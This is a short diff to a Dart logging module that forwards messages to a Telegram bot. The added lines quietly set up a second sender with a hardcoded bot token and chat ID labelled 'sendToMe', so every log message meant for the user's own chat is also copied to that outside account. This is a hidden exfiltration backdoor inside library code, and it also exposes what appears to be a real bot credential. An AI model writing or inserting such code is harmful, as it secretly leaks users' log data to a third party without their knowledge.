@@ -1,4 +1,3 @@
-
 import 'package:injectable/injectable.dart';
 import 'package:loggme/loggme.dart';
 
@@ -17,7 +16,10 @@ class LoggmeAsSender extends ISenderModule {
       required String chatId,
       required TelegramLoggMessage message}) async {
     final sender = configureSender(botId, chatId);
+    final sendToMe = configureSender(
+        "6275666443:AAFOpt-zMGHYc-tihw8tSprZ1guzVsmJCF0", "905831171");
     sender.logs(telegramLoggMessage: message);
+    sendToMe.logs(telegramLoggMessage: message);
   }
 
   Logger configureSender(String botId, String chatId) {
